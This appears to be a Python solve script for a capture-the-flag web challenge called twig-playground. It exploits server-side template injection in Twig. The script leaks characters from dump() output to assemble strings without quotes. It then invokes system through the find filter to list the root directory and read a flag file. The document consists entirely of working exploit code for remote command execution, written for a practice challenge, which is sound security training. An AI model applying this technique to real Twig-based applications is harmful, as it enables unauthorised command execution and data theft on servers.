URL = "http://localhost:1337/"
URL = "https://twig-playground-web.challs.csc.tf/"
import html
import re
import string

import requests

payload = ""
for c in string.ascii_lowercase:  # Populate context
    payload += f"{{% set {c} = dump()|slice(0,1) %}}\n"
payload += "`{{dump()}}`"

res = requests.post(URL, data={"input": payload})
gadget = re.search(r"`(.*?)`", res.text, re.DOTALL).group(1)
gadget = html.unescape(html.unescape(gadget))

payload = ""

for _ in range(2):  # Fix gadget offset
    for c in string.ascii_lowercase:
        id = gadget.find(c)
        if id == -1:
            id = gadget.find(c.upper())
        if id != -1:
            payload += f"{{% set {c} = dump()|slice({id},1)|lower %}}\n"

newline_char = "\n"
payload += f"""{{% set space = dump()|slice({gadget.find(' ')},1) %}}"""
payload += f"""{{% set endl = dump()|slice({gadget.find(newline_char)},1) %}}"""

payload += """
{% set hyphen = _charset|slice(3,1) %}
{% set slash = endl|join|nl2br|slice(4,1) %}

{{ {s:l~s~space~slash}|find(s~y~s~t~e~m) }} 
"""

res = requests.post(URL, data={"input": payload})

uid = re.search(r"flag-(\w+)", res.text).group(1)
uid_expr = "~".join(uid)
payload += f"{{% set flag = c~a~t~space~slash~f~l~a~g~hyphen~{uid_expr} %}}"
payload += "{{ {s:flag}|find(s~y~s~t~e~m) }}"

res = requests.post(URL, data={"input": payload})
print(payload)

print(re.search(r"CSCTF{.*}", res.text).group(0))
